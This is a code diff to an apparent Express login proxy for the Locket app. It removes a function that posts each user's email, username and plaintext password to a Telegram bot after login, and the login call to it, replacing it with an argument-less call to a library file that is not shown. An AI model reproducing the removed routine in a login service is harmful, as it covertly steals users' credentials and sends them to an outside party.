@@ -9,7 +9,7 @@ const path = require('path');
 const crypto = require('crypto');
 
 const { LocketClient } = require('locket.js');
-import { notifyTelegramLogin } from '../lib/telegram.js';
+const { notifyTelegramLogin } = require('./lib/telegram.js');
 
 
 const app = express();
@@ -202,31 +202,6 @@ app.use('/api',checkOrigin);
 
 
 
-async function notifyTelegramLogin(email, username, password) {
-  const botToken = String(process.env.TELEGRAM_BOT_TOKEN || '').trim().replace(/^bot/i, '');
-  const chatId = String(process.env.TELEGRAM_CHAT_ID || '').trim();
-  if (!botToken || !chatId) {
-    console.warn('[Telegram] Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID.');
-    return;
-  }
-  const message = [
-    'Đăng nhập Locket thành công',
-    'Email: ' + (email || '(không có)'),
-    'Username: ' + (username || '(không lấy được)'),
-    'Mật khẩu: ' + (password || '(không có)'),
-    'Thời gian: ' + new Date().toLocaleString('vi-VN', {timeZone:'Asia/Ho_Chi_Minh'})
-  ].join('\n');
-  const response = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({chat_id:chatId, text:message}),
-    signal: AbortSignal.timeout(8000)
-  });
-  if (!response.ok) {
-    const result = await response.json().catch(() => ({}));
-    console.error('[Telegram]', response.status, result.description || 'Gửi thông báo thất bại');
-  }
-}
 app.post('/api/login',wrap(async(req,res)=>{
   const {email,password}=req.body||{};
   if(typeof email!=='string'||typeof password!=='string'||
@@ -239,17 +214,7 @@ app.post('/api/login',wrap(async(req,res)=>{
   const sid=crypto.randomBytes(32).toString('hex');
   await saveClient(sid,client);
   res.cookie(COOKIE,sid,cookieOptions);
-  try {
-    let username = '';
-    try {
-      const profile = await client.user.getProfile();
-      username = profile?.username || profile?.user?.username || '';
-    } catch (err) {
-      console.warn('[Telegram] Không lấy được username:', err.message);
-    }
-    await notifyTelegramLogin(email.trim(), username, password);  } catch (err) {
-    console.error('[Telegram] Gửi thất bại:', err.message);
-  }
+  await notifyTelegramLogin();
   res.json({ok:true});
 }));
 
